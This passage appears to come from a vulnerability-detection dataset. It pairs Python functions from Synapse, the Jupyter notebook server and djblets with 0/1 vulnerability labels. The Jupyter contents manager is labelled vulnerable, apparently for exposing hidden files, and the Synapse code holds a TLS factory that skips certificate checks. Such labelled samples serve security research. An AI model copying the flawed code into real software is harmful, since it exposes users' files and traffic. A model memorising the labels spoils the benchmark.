hs.config.user_agent_suffix:\n            self.user_agent = \"%s %s\" % (self.user_agent, hs.config.user_agent_suffix)\n\n        # We use this for our body producers to ensure that they use the correct\n        # reactor.\n        self._cooperator = Cooperator(scheduler=_make_scheduler(hs.get_reactor()))\n\n        self.user_agent = self.user_agent.encode(\"ascii\")\n\n        if self._ip_blacklist:\n            # If we have an IP blacklist, we need to use a DNS resolver which\n            # filters out blacklisted IP addresses, to prevent DNS rebinding.\n            self.reactor = BlacklistingReactorWrapper(\n                hs.get_reactor(), self._ip_whitelist, self._ip_blacklist\n            )\n        else:\n            self.reactor = hs.get_reactor()\n\n        # the pusher makes lots of concurrent SSL connections to sygnal, and\n        # tends to do so in batches, so we need to allow the pool to keep\n        # lots of idle connections around.\n        pool = HTTPConnectionPool(self.reactor)\n        # XXX: The justification for using the cache factor here is that larger instances\n        # will need both more cache and more connections.\n        # Still, this should probably be a separate dial\n        pool.maxPersistentPerHost = max((100 * hs.config.caches.global_factor, 5))\n        pool.cachedConnectionTimeout = 2 * 60\n\n        self.agent = ProxyAgent(\n            self.reactor,\n            connectTimeout=15,\n            contextFactory=self.hs.get_http_client_context_factory(),\n            pool=pool,\n            http_proxy=http_proxy,\n            https_proxy=https_proxy,\n        )\n\n        if self._ip_blacklist:\n            # If we have an IP blacklist, we then install the blacklisting Agent\n            # which prevents direct access to IP addresses, that are not caught\n            # by the DNS resolution.\n            self.agent = BlacklistingAgentWrapper(\n                self.agent,\n                ip_whitelist=self._ip_whitelist,\n                ip_blacklist=self._ip_blacklist,\n            )\n\n    async def request(\n        self,\n        method: str,\n        uri: str,\n        data: Optional[bytes] = None,\n        headers: Optional[Headers] = None,\n    ) -> IResponse:\n        \"\"\"\n        Args:\n            method: HTTP method to use.\n            uri: URI to query.\n            data: Data to send in the request body, if applicable.\n            headers: Request headers.\n\n        Returns:\n            Response object, once the headers have been read.\n\n        Raises:\n            RequestTimedOutError if the request times out before the headers are read\n\n        \"\"\"\n        outgoing_requests_counter.labels(method).inc()\n\n        # log request but strip `access_token` (AS requests for example include this)\n        logger.debug(\"Sending request %s %s\", method, redact_uri(uri))\n\n        with start_active_span(\n            \"outgoing-client-request\",\n            tags={\n                tags.SPAN_KIND: tags.SPAN_KIND_RPC_CLIENT,\n                tags.HTTP_METHOD: method,\n                tags.HTTP_URL: uri,\n            },\n            finish_on_close=True,\n        ):\n            try:\n                body_producer = None\n                if data is not None:\n                    body_producer = QuieterFileBodyProducer(\n                        BytesIO(data), cooperator=self._cooperator,\n                    )\n\n                request_deferred = treq.request(\n                    method,\n                    uri,\n                    agent=self.agent,\n                    data=body_producer,\n                    headers=headers,\n                    **self._extra_treq_args,\n                )  # type: defer.Deferred\n\n                # we use our own timeout mechanism rather than treq's as a workaround\n                # for https://twistedmatrix.com/trac/ticket/9534.\n                request_deferred = timeout_deferred(\n                    request_deferred, 60, self.hs.get_reactor(),\n                )\n\n                # turn timeouts into RequestTimedOutErrors\n                request_deferred.addErrback(_timeout_to_request_timed_out_error)\n\n                response = await make_deferred_yieldable(request_deferred)\n\n                incoming_responses_counter.labels(method, response.code).inc()\n                logger.info(\n                    \"Received response to %s %s: %s\",\n                    method,\n                    redact_uri(uri),\n                    response.code,\n                )\n                return response\n            except Exception as e:\n                incoming_responses_counter.labels(method, \"ERR\").inc()\n                logger.info(\n                    \"Error sending request to  %s %s: %s %s\",\n                    method,\n                    redact_uri(uri),\n                    type(e).__name__,\n                    e.args[0],\n                )\n                set_tag(tags.ERROR, True)\n                set_tag(\"error_reason\", e.args[0])\n                raise\n\n    async def post_urlencoded_get_json(\n        self,\n        uri: str,\n        args: Optional[Mapping[str, Union[str, List[str]]]] = None,\n        headers: Optional[RawHeaders] = None,\n    ) -> Any:\n        \"\"\"\n        Args:\n            uri: uri to query\n            args: parameters to be url-encoded in the body\n            headers: a map from header name to a list of values for that header\n\n        Returns:\n            parsed json\n\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException: On a non-2xx HTTP response.\n\n            ValueError: if the response was not JSON\n        \"\"\"\n\n        # TODO: Do we ever want to log message contents?\n        logger.debug(\"post_urlencoded_get_json args: %s\", args)\n\n        query_bytes = encode_query_args(args)\n\n        actual_headers = {\n            b\"Content-Type\": [b\"application/x-www-form-urlencoded\"],\n            b\"User-Agent\": [self.user_agent],\n            b\"Accept\": [b\"application/json\"],\n        }\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\n            \"POST\", uri, headers=Headers(actual_headers), data=query_bytes\n        )\n\n        body = await make_deferred_yieldable(readBody(response))\n\n        if 200 <= response.code < 300:\n            return json_decoder.decode(body.decode(\"utf-8\"))\n        else:\n            raise HttpResponseException(\n                response.code, response.phrase.decode(\"ascii\", errors=\"replace\"), body\n            )\n\n    async def post_json_get_json(\n        self, uri: str, post_json: Any, headers: Optional[RawHeaders] = None\n    ) -> Any:\n        \"\"\"\n\n        Args:\n            uri: URI to query.\n            post_json: request body, to be encoded as json\n            headers: a map from header name to a list of values for that header\n\n        Returns:\n            parsed json\n\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException: On a non-2xx HTTP response.\n\n            ValueError: if the response was not JSON\n        \"\"\"\n        json_str = encode_canonical_json(post_json)\n\n        logger.debug(\"HTTP POST %s -> %s\", json_str, uri)\n\n        actual_headers = {\n            b\"Content-Type\": [b\"application/json\"],\n            b\"User-Agent\": [self.user_agent],\n            b\"Accept\": [b\"application/json\"],\n        }\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\n            \"POST\", uri, headers=Headers(actual_headers), data=json_str\n        )\n\n        body = await make_deferred_yieldable(readBody(response))\n\n        if 200 <= response.code < 300:\n            return json_decoder.decode(body.decode(\"utf-8\"))\n        else:\n            raise HttpResponseException(\n                response.code, response.phrase.decode(\"ascii\", errors=\"replace\"), body\n            )\n\n    async def get_json(\n        self,\n        uri: str,\n        args: Optional[QueryParams] = None,\n        headers: Optional[RawHeaders] = None,\n    ) -> Any:\n        \"\"\"Gets some json from the given URI.\n\n        Args:\n            uri: The URI to request, not including query parameters\n            args: A dictionary used to create query string\n            headers: a map from header name to a list of values for that header\n        Returns:\n            Succeeds when we get a 2xx HTTP response, with the HTTP body as JSON.\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException On a non-2xx HTTP response.\n\n            ValueError: if the response was not JSON\n        \"\"\"\n        actual_headers = {b\"Accept\": [b\"application/json\"]}\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        body = await self.get_raw(uri, args, headers=headers)\n        return json_decoder.decode(body.decode(\"utf-8\"))\n\n    async def put_json(\n        self,\n        uri: str,\n        json_body: Any,\n        args: Optional[QueryParams] = None,\n        headers: RawHeaders = None,\n    ) -> Any:\n        \"\"\"Puts some json to the given URI.\n\n        Args:\n            uri: The URI to request, not including query parameters\n            json_body: The JSON to put in the HTTP body,\n            args: A dictionary used to create query strings\n            headers: a map from header name to a list of values for that header\n        Returns:\n            Succeeds when we get a 2xx HTTP response, with the HTTP body as JSON.\n        Raises:\n             RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException On a non-2xx HTTP response.\n\n            ValueError: if the response was not JSON\n        \"\"\"\n        if args:\n            query_str = urllib.parse.urlencode(args, True)\n            uri = \"%s?%s\" % (uri, query_str)\n\n        json_str = encode_canonical_json(json_body)\n\n        actual_headers = {\n            b\"Content-Type\": [b\"application/json\"],\n            b\"User-Agent\": [self.user_agent],\n            b\"Accept\": [b\"application/json\"],\n        }\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\n            \"PUT\", uri, headers=Headers(actual_headers), data=json_str\n        )\n\n        body = await make_deferred_yieldable(readBody(response))\n\n        if 200 <= response.code < 300:\n            return json_decoder.decode(body.decode(\"utf-8\"))\n        else:\n            raise HttpResponseException(\n                response.code, response.phrase.decode(\"ascii\", errors=\"replace\"), body\n            )\n\n    async def get_raw(\n        self,\n        uri: str,\n        args: Optional[QueryParams] = None,\n        headers: Optional[RawHeaders] = None,\n    ) -> bytes:\n        \"\"\"Gets raw text from the given URI.\n\n        Args:\n            uri: The URI to request, not including query parameters\n            args: A dictionary used to create query strings\n            headers: a map from header name to a list of values for that header\n        Returns:\n            Succeeds when we get a 2xx HTTP response, with the\n            HTTP body as bytes.\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            HttpResponseException on a non-2xx HTTP response.\n        \"\"\"\n        if args:\n            query_str = urllib.parse.urlencode(args, True)\n            uri = \"%s?%s\" % (uri, query_str)\n\n        actual_headers = {b\"User-Agent\": [self.user_agent]}\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\"GET\", uri, headers=Headers(actual_headers))\n\n        body = await make_deferred_yieldable(readBody(response))\n\n        if 200 <= response.code < 300:\n            return body\n        else:\n            raise HttpResponseException(\n                response.code, response.phrase.decode(\"ascii\", errors=\"replace\"), body\n            )\n\n    # XXX: FIXME: This is horribly copy-pasted from matrixfederationclient.\n    # The two should be factored out.\n\n    async def get_file(\n        self,\n        url: str,\n        output_stream: BinaryIO,\n        max_size: Optional[int] = None,\n        headers: Optional[RawHeaders] = None,\n    ) -> Tuple[int, Dict[bytes, List[bytes]], str, int]:\n        \"\"\"GETs a file from a given URL\n        Args:\n            url: The URL to GET\n            output_stream: File to write the response body to.\n            headers: A map from header name to a list of values for that header\n        Returns:\n            A tuple of the file length, dict of the response\n            headers, absolute URI of the response and HTTP response code.\n\n        Raises:\n            RequestTimedOutError: if there is a timeout before the response headers\n               are received. Note there is currently no timeout on reading the response\n               body.\n\n            SynapseError: if the response is not a 2xx, the remote file is too large, or\n               another exception happens during the download.\n        \"\"\"\n\n        actual_headers = {b\"User-Agent\": [self.user_agent]}\n        if headers:\n            actual_headers.update(headers)  # type: ignore\n\n        response = await self.request(\"GET\", url, headers=Headers(actual_headers))\n\n        resp_headers = dict(response.headers.getAllRawHeaders())\n\n        if (\n            b\"Content-Length\" in resp_headers\n            and max_size\n            and int(resp_headers[b\"Content-Length\"][0]) > max_size\n        ):\n            logger.warning(\"Requested URL is too large > %r bytes\" % (max_size,))\n            raise SynapseError(\n                502,\n                \"Requested file is too large > %r bytes\" % (max_size,),\n                Codes.TOO_LARGE,\n            )\n\n        if response.code > 299:\n            logger.warning(\"Got %d when downloading %s\" % (response.code, url))\n            raise SynapseError(502, \"Got error %d\" % (response.code,), Codes.UNKNOWN)\n\n        # TODO: if our Content-Type is HTML or something, just read the first\n        # N bytes into RAM rather than saving it all to disk only to read it\n        # straight back in again\n\n        try:\n            length = await make_deferred_yieldable(\n                readBodyToFile(response, output_stream, max_size)\n            )\n        except SynapseError:\n            # This can happen e.g. because the body is too large.\n            raise\n        except Exception as e:\n            raise SynapseError(502, (\"Failed to download remote body: %s\" % e)) from e\n\n        return (\n            length,\n            resp_headers,\n            response.request.absoluteURI.decode(\"ascii\"),\n            response.code,\n        )\n\n\ndef _timeout_to_request_timed_out_error(f: Failure):\n    if f.check(twisted_error.TimeoutError, twisted_error.ConnectingCancelledError):\n        # The TCP connection has its own timeout (set by the 'connectTimeout' param\n        # on the Agent), which raises twisted_error.TimeoutError exception.\n        raise RequestTimedOutError(\"Timeout connecting to remote server\")\n    elif f.check(defer.TimeoutError, ResponseNeverReceived):\n        # this one means that we hit our overall timeout on the request\n        raise RequestTimedOutError(\"Timeout waiting for response from remote server\")\n\n    return f\n\n\nclass _ReadBodyToFileProtocol(protocol.Protocol):\n    def __init__(\n        self, stream: BinaryIO, deferred: defer.Deferred, max_size: Optional[int]\n    ):\n        self.stream = stream\n        self.deferred = deferred\n        self.length = 0\n        self.max_size = max_size\n\n    def dataReceived(self, data: bytes) -> None:\n        self.stream.write(data)\n        self.length += len(data)\n        if self.max_size is not None and self.length >= self.max_size:\n            self.deferred.errback(\n                SynapseError(\n                    502,\n                    \"Requested file is too large > %r bytes\" % (self.max_size,),\n                    Codes.TOO_LARGE,\n                )\n            )\n            self.deferred = defer.Deferred()\n            self.transport.loseConnection()\n\n    def connectionLost(self, reason: Failure) -> None:\n        if reason.check(ResponseDone):\n            self.deferred.callback(self.length)\n        elif reason.check(PotentialDataLoss):\n            # stolen from https://github.com/twisted/treq/pull/49/files\n            # http://twistedmatrix.com/trac/ticket/4840\n            self.deferred.callback(self.length)\n        else:\n            self.deferred.errback(reason)\n\n\ndef readBodyToFile(\n    response: IResponse, stream: BinaryIO, max_size: Optional[int]\n) -> defer.Deferred:\n    \"\"\"\n    Read a HTTP response body to a file-object. Optionally enforcing a maximum file size.\n\n    Args:\n        response: The HTTP response to read from.\n        stream: The file-object to write to.\n        max_size: The maximum file size to allow.\n\n    Returns:\n        A Deferred which resolves to the length of the read body.\n    \"\"\"\n\n    d = defer.Deferred()\n    response.deliverBody(_ReadBodyToFileProtocol(stream, d, max_size))\n    return d\n\n\ndef encode_query_args(args: Optional[Mapping[str, Union[str, List[str]]]]) -> bytes:\n    \"\"\"\n    Encodes a map of query arguments to bytes which can be appended to a URL.\n\n    Args:\n        args: The query arguments, a mapping of string to string or list of strings.\n\n    Returns:\n        The query arguments encoded as bytes.\n    \"\"\"\n    if args is None:\n        return b\"\"\n\n    encoded_args = {}\n    for k, vs in args.items():\n        if isinstance(vs, str):\n            vs = [vs]\n        encoded_args[k] = [v.encode(\"utf8\") for v in vs]\n\n    query_str = urllib.parse.urlencode(encoded_args, True)\n\n    return query_str.encode(\"utf8\")\n\n\nclass InsecureInterceptableContextFactory(ssl.ContextFactory):\n    \"\"\"\n    Factory for PyOpenSSL SSL contexts which accepts any certificate for any domain.\n\n    Do not use this since it allows an attacker to intercept your communications.\n    \"\"\"\n\n    def __init__(self):\n        self._context = SSL.Context(SSL.SSLv23_METHOD)\n        self._context.set_verify(VERIFY_NONE, lambda *_: None)\n\n    def getContext(self, hostname=None, port=None):\n        return self._context\n\n    def creatorForNetloc(self, hostname, port):\n        return self\n", "target": 0}
{"idx": 1063, "func": "\"\"\"A contents manager that uses the local file system for storage.\"\"\"\n\n# Copyright (c) Jupyter Development Team.\n# Distributed under the terms of the Modified BSD License.\n\n\nimport io\nimport os\nimport shutil\nimport mimetypes\nimport nbformat\n\nfrom tornado import web\n\nfrom .filecheckpoints import FileCheckpoints\nfrom .fileio import FileManagerMixin\nfrom .manager import ContentsManager\n\n\nfrom ipython_genutils.importstring import import_item\nfrom traitlets import Any, Unicode, Bool, TraitError\nfrom ipython_genutils.py3compat import getcwd, string_types\nfrom . import tz\nfrom notebook.utils import (\n    is_hidden,\n    to_api_path,\n)\n\n_script_exporter = None\n\n\ndef _post_save_script(model, os_path, contents_manager, **kwargs):\n    \"\"\"convert notebooks to Python script after save with nbconvert\n\n    replaces `ipython notebook --script`\n    \"\"\"\n    from nbconvert.exporters.script import ScriptExporter\n\n    if model['type'] != 'notebook':\n        return\n\n    global _script_exporter\n    if _script_exporter is None:\n        _script_exporter = ScriptExporter(parent=contents_manager)\n    log = contents_manager.log\n\n    base, ext = os.path.splitext(os_path)\n    py_fname = base + '.py'\n    script, resources = _script_exporter.from_filename(os_path)\n    script_fname = base + resources.get('output_extension', '.txt')\n    log.info(\"Saving script /%s\", to_api_path(script_fname, contents_manager.root_dir))\n    with io.open(script_fname, 'w', encoding='utf-8') as f:\n        f.write(script)\n\n\nclass FileContentsManager(FileManagerMixin, ContentsManager):\n\n    root_dir = Unicode(config=True)\n\n    def _root_dir_default(self):\n        try:\n            return self.parent.notebook_dir\n        except AttributeError:\n            return getcwd()\n\n    save_script = Bool(False, config=True, help='DEPRECATED, use post_save_hook')\n    def _save_script_changed(self):\n        self.log.warn(\"\"\"\n        `--script` is deprecated. You can trigger nbconvert via pre- or post-save hooks:\n\n            ContentsManager.pre_save_hook\n            FileContentsManager.post_save_hook\n\n        A post-save hook has been registered that calls:\n\n            ipython nbconvert --to script [notebook]\n\n        which behaves similarly to `--script`.\n        \"\"\")\n\n        self.post_save_hook = _post_save_script\n\n    post_save_hook = Any(None, config=True,\n        help=\"\"\"Python callable or importstring thereof\n\n        to be called on the path of a file just saved.\n\n        This can be used to process the file on disk,\n        such as converting the notebook to a script or HTML via nbconvert.\n\n        It will be called as (all arguments passed by keyword)::\n\n            hook(os_path=os_path, model=model, contents_manager=instance)\n\n        - path: the filesystem path to the file just written\n        - model: the model representing the file\n        - contents_manager: this ContentsManager instance\n        \"\"\"\n    )\n    def _post_save_hook_changed(self, name, old, new):\n        if new and isinstance(new, string_types):\n            self.post_save_hook = import_item(self.post_save_hook)\n        elif new:\n            if not callable(new):\n                raise TraitError(\"post_save_hook must be callable\")\n\n    def run_post_save_hook(self, model, os_path):\n        \"\"\"Run the post-save hook if defined, and log errors\"\"\"\n        if self.post_save_hook:\n            try:\n                self.log.debug(\"Running post-save hook on %s\", os_path)\n                self.post_save_hook(os_path=os_path, model=model, contents_manager=self)\n            except Exception:\n                self.log.error(\"Post-save hook failed on %s\", os_path, exc_info=True)\n\n    def _root_dir_changed(self, name, old, new):\n        \"\"\"Do a bit of validation of the root_dir.\"\"\"\n        if not os.path.isabs(new):\n            # If we receive a non-absolute path, make it absolute.\n            self.root_dir = os.path.abspath(new)\n            return\n        if not os.path.isdir(new):\n            raise TraitError(\"%r is not a directory\" % new)\n\n    def _checkpoints_class_default(self):\n        return FileCheckpoints\n\n    def is_hidden(self, path):\n        \"\"\"Does the API style path correspond to a hidden directory or file?\n\n        Parameters\n        ----------\n        path : string\n            The path to check. This is an API path (`/` separated,\n            relative to root_dir).\n\n        Returns\n        -------\n        hidden : bool\n            Whether the path exists and is hidden.\n        \"\"\"\n        path = path.strip('/')\n        os_path = self._get_os_path(path=path)\n        return is_hidden(os_path, self.root_dir)\n\n    def file_exists(self, path):\n        \"\"\"Returns True if the file exists, else returns False.\n\n        API-style wrapper for os.path.isfile\n\n        Parameters\n        ----------\n        path : string\n            The relative path to the file (with '/' as separator)\n\n        Returns\n        -------\n        exists : bool\n            Whether the file exists.\n        \"\"\"\n        path = path.strip('/')\n        os_path = self._get_os_path(path)\n        return os.path.isfile(os_path)\n\n    def dir_exists(self, path):\n        \"\"\"Does the API-style path refer to an extant directory?\n\n        API-style wrapper for os.path.isdir\n\n        Parameters\n        ----------\n        path : string\n            The path to check. This is an API path (`/` separated,\n            relative to root_dir).\n\n        Returns\n        -------\n        exists : bool\n            Whether the path is indeed a directory.\n        \"\"\"\n        path = path.strip('/')\n        os_path = self._get_os_path(path=path)\n        return os.path.isdir(os_path)\n\n    def exists(self, path):\n        \"\"\"Returns True if the path exists, else returns False.\n\n        API-style wrapper for os.path.exists\n\n        Parameters\n        ----------\n        path : string\n            The API path to the file (with '/' as separator)\n\n        Returns\n        -------\n        exists : bool\n            Whether the target exists.\n        \"\"\"\n        path = path.strip('/')\n        os_path = self._get_os_path(path=path)\n        return os.path.exists(os_path)\n\n    def _base_model(self, path):\n        \"\"\"Build the common base of a contents model\"\"\"\n        os_path = self._get_os_path(path)\n        info = os.stat(os_path)\n        last_modified = tz.utcfromtimestamp(info.st_mtime)\n        created = tz.utcfromtimestamp(info.st_ctime)\n        # Create the base model.\n        model = {}\n        model['name'] = path.rsplit('/', 1)[-1]\n        model['path'] = path\n        model['last_modified'] = last_modified\n        model['created'] = created\n        model['content'] = None\n        model['format'] = None\n        model['mimetype'] = None\n        try:\n            model['writable'] = os.access(os_path, os.W_OK)\n        except OSError:\n            self.log.error(\"Failed to check write permissions on %s\", os_path)\n            model['writable'] = False\n        return model\n\n    def _dir_model(self, path, content=True):\n        \"\"\"Build a model for a directory\n\n        if content is requested, will include a listing of the directory\n        \"\"\"\n        os_path = self._get_os_path(path)\n\n        four_o_four = u'directory does not exist: %r' % path\n\n        if not os.path.isdir(os_path):\n            raise web.HTTPError(404, four_o_four)\n        elif is_hidden(os_path, self.root_dir):\n            self.log.info(\"Refusing to serve hidden directory %r, via 404 Error\",\n                os_path\n            )\n            raise web.HTTPError(404, four_o_four)\n\n        model = self._base_model(path)\n        model['type'] = 'directory'\n        if content:\n            model['content'] = contents = []\n            os_dir = self._get_os_path(path)\n            for name in os.listdir(os_dir):\n                os_path = os.path.join(os_dir, name)\n                # skip over broken symlinks in listing\n                if not os.path.exists(os_path):\n                    self.log.warn(\"%s doesn't exist\", os_path)\n                    continue\n                elif not os.path.isfile(os_path) and not os.path.isdir(os_path):\n                    self.log.debug(\"%s not a regular file\", os_path)\n                    continue\n                if self.should_list(name) and not is_hidden(os_path, self.root_dir):\n                    contents.append(self.get(\n                        path='%s/%s' % (path, name),\n                        content=False)\n                    )\n\n            model['format'] = 'json'\n\n        return model\n\n    def _file_model(self, path, content=True, format=None):\n        \"\"\"Build a model for a file\n\n        if content is requested, include the file contents.\n\n        format:\n          If 'text', the contents will be decoded as UTF-8.\n          If 'base64', the raw bytes contents will be encoded as base64.\n          If not specified, try to decode as UTF-8, and fall back to base64\n        \"\"\"\n        model = self._base_model(path)\n        model['type'] = 'file'\n\n        os_path = self._get_os_path(path)\n\n        if content:\n            content, format = self._read_file(os_path, format)\n            default_mime = {\n                'text': 'text/plain',\n                'base64': 'application/octet-stream'\n            }[format]\n\n            model.update(\n                content=content,\n                format=format,\n                mimetype=mimetypes.guess_type(os_path)[0] or default_mime,\n            )\n\n        return model\n\n    def _notebook_model(self, path, content=True):\n        \"\"\"Build a notebook model\n\n        if content is requested, the notebook content will be populated\n        as a JSON structure (not double-serialized)\n        \"\"\"\n        model = self._base_model(path)\n        model['type'] = 'notebook'\n        if content:\n            os_path = self._get_os_path(path)\n            nb = self._read_notebook(os_path, as_version=4)\n            self.mark_trusted_cells(nb, path)\n            model['content'] = nb\n            model['format'] = 'json'\n            self.validate_notebook_model(model)\n        return model\n\n    def get(self, path, content=True, type=None, format=None):\n        \"\"\" Takes a path for an entity and returns its model\n\n        Parameters\n        ----------\n        path : str\n            the API path that describes the relative path for the target\n        content : bool\n            Whether to include the contents in the reply\n        type : str, optional\n            The requested type - 'file', 'notebook', or 'directory'.\n            Will raise HTTPError 400 if the content doesn't match.\n        format : str, optional\n            The requested format for file contents. 'text' or 'base64'.\n            Ignored if this returns a notebook or directory model.\n\n        Returns\n        -------\n        model : dict\n            the contents model. If content=True, returns the contents\n            of the file or directory as well.\n        \"\"\"\n        path = path.strip('/')\n\n        if not self.exists(path):\n            raise web.HTTPError(404, u'No such file or directory: %s' % path)\n\n        os_path = self._get_os_path(path)\n        if os.path.isdir(os_path):\n            if type not in (None, 'directory'):\n                raise web.HTTPError(400,\n                                u'%s is a directory, not a %s' % (path, type), reason='bad type')\n            model = self._dir_model(path, content=content)\n        elif type == 'notebook' or (type is None and path.endswith('.ipynb')):\n            model = self._notebook_model(path, content=content)\n        else:\n            if type == 'directory':\n                raise web.HTTPError(400,\n                                u'%s is not a directory' % path, reason='bad type')\n            model = self._file_model(path, content=content, format=format)\n        return model\n\n    def _save_directory(self, os_path, model, path=''):\n        \"\"\"create a directory\"\"\"\n        if is_hidden(os_path, self.root_dir):\n            raise web.HTTPError(400, u'Cannot create hidden directory %r' % os_path)\n        if not os.path.exists(os_path):\n            with self.perm_to_403():\n                os.mkdir(os_path)\n        elif not os.path.isdir(os_path):\n            raise web.HTTPError(400, u'Not a directory: %s' % (os_path))\n        else:\n            self.log.debug(\"Directory %r already exists\", os_path)\n\n    def save(self, model, path=''):\n        \"\"\"Save the file model and return the model with no content.\"\"\"\n        path = path.strip('/')\n\n        if 'type' not in model:\n            raise web.HTTPError(400, u'No file type provided')\n        if 'content' not in model and model['type'] != 'directory':\n            raise web.HTTPError(400, u'No file content provided')\n\n        os_path = self._get_os_path(path)\n        self.log.debug(\"Saving %s\", os_path)\n\n        self.run_pre_save_hook(model=model, path=path)\n\n        try:\n            if model['type'] == 'notebook':\n                nb = nbformat.from_dict(model['content'])\n                self.check_and_sign(nb, path)\n                self._save_notebook(os_path, nb)\n                # One checkpoint should always exist for notebooks.\n                if not self.checkpoints.list_checkpoints(path):\n                    self.create_checkpoint(path)\n            elif model['type'] == 'file':\n                # Missing format will be handled internally by _save_file.\n                self._save_file(os_path, model['content'], model.get('format'))\n            elif model['type'] == 'directory':\n                self._save_directory(os_path, model, path)\n            else:\n                raise web.HTTPError(400, \"Unhandled contents type: %s\" % model['type'])\n        except web.HTTPError:\n            raise\n        except Exception as e:\n            self.log.error(u'Error while saving file: %s %s', path, e, exc_info=True)\n            raise web.HTTPError(500, u'Unexpected error while saving file: %s %s' % (path, e))\n\n        validation_message = None\n        if model['type'] == 'notebook':\n            self.validate_notebook_model(model)\n            validation_message = model.get('message', None)\n\n        model = self.get(path, content=False)\n        if validation_message:\n            model['message'] = validation_message\n\n        self.run_post_save_hook(model=model, os_path=os_path)\n\n        return model\n\n    def delete_file(self, path):\n        \"\"\"Delete file at path.\"\"\"\n        path = path.strip('/')\n        os_path = self._get_os_path(path)\n        rm = os.unlink\n        if os.path.isdir(os_path):\n            listing = os.listdir(os_path)\n            # Don't delete non-empty directories.\n            # A directory containing only leftover checkpoints is\n            # considered empty.\n            cp_dir = getattr(self.checkpoints, 'checkpoint_dir', None)\n            for entry in listing:\n                if entry != cp_dir:\n                    raise web.HTTPError(400, u'Directory %s not empty' % os_path)\n        elif not os.path.isfile(os_path):\n            raise web.HTTPError(404, u'File does not exist: %s' % os_path)\n\n        if os.path.isdir(os_path):\n            self.log.debug(\"Removing directory %s\", os_path)\n            with self.perm_to_403():\n                shutil.rmtree(os_path)\n        else:\n            self.log.debug(\"Unlinking file %s\", os_path)\n            with self.perm_to_403():\n                rm(os_path)\n\n    def rename_file(self, old_path, new_path):\n        \"\"\"Rename a file.\"\"\"\n        old_path = old_path.strip('/')\n        new_path = new_path.strip('/')\n        if new_path == old_path:\n            return\n\n        new_os_path = self._get_os_path(new_path)\n        old_os_path = self._get_os_path(old_path)\n\n        # Should we proceed with the move?\n        if os.path.exists(new_os_path):\n            raise web.HTTPError(409, u'File already exists: %s' % new_path)\n\n        # Move the file\n        try:\n            with self.perm_to_403():\n                shutil.move(old_os_path, new_os_path)\n        except web.HTTPError:\n            raise\n        except Exception as e:\n            raise web.HTTPError(500, u'Unknown error renaming file: %s %s' % (old_path, e))\n\n    def info_string(self):\n        return \"Serving notebooks from local directory: %s\" % self.root_dir\n\n    def get_kernel_path(self, path, model=None):\n        \"\"\"Return the initial API path of  a kernel associated with a given notebook\"\"\"\n        if '/' in path:\n            parent_dir = path.rsplit('/', 1)[0]\n        else:\n            parent_dir = ''\n        return parent_dir\n", "target": 1}
{"idx": 1064, "func": "#\n# gravatars.py -- Decorational template tags\n#\n# Copyright (c) 2008-2009  Christian Hammond\n#\n# Permission is hereby granted, free of charge, to any person obtaining\n# a copy of this software and associated documentation files (the\n# \"Software\"), to deal in the Software without restriction, including\n# without limitation the rights to use, copy, modify, merge, publish,\n# distribute, sublicense, and/or sell copies of the Software, and to\n# permit persons to whom the Software is furnished to do so, subject to\n# the following conditions:\n#\n# The above copyright notice and this permission notice shall be included\n# in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\n# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY\n# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,\n# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE\n# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\nfrom __future__ import unicode_literals\n\nfrom django import template\nfrom django.utils.html import format_html\n\nfrom djblets.gravatars import (get_gravatar_url,\n                               get_gravatar_url_for_email)\nfrom djblets.util.decorators import basictag\n\n\nregister = template.Library()\n\n\n@register.tag\n@basictag(takes_context=True)\ndef gravatar(context, user, size=None):\n    \"\"\"\n    Outputs the HTML for displaying a user's gravatar.\n\n    This can take an optional size of the image (defaults to 80 if not\n    specified).\n\n    This is also influenced by the following settings:\n\n        GRAVATAR_SIZE    - Default size for gravatars\n        GRAVATAR_RATING  - Maximum allowed rating (g, pg, r, x)\n        GRAVATAR_DEFAULT - Default image set to show if the user hasn't\n                           specified a gravatar (identicon, monsterid, wavatar)\n\n    See http://www.gravatar.com/ for more information.\n    \"\"\"\n    url = get_gravatar_url(context['request'], user, size)\n\n    if url:\n        return format_html(\n            '<img src=\"{0}\" width=\"{1}\" height=\"{1}\" alt=\"{2}\" '\n            'class=\"gravatar\"/>',\n            url, size, user.get_full_name() or user.username)\n    else:\n        return ''\n\n\n@register.tag\n@basictag(takes_context=True)\ndef gravatar_url(context, email, size=None):\n    \"\"\"\n    Outputs the URL for a gravatar for the given email address.\n\n    This can take an optional size of the image (defaults to 80 if not\n    specified).\n\n    This is also influenced by the following settings:\n\n        GRAVATAR_SIZE    - Default size for gravatars\n        GRAVATAR_RATING  - Maximum allowed rating (g, pg, r, x)\n        GRAVATAR_DEFAULT - Default image set to show if the user hasn't\n                           specified a gravatar (identicon, monsterid, wavatar)\n\n    See http://www.gravatar.com/ for more information.\n    \"\"\"\n    return get_gravatar_url_for_email(context['request'], email, size)\n", "target": 0}
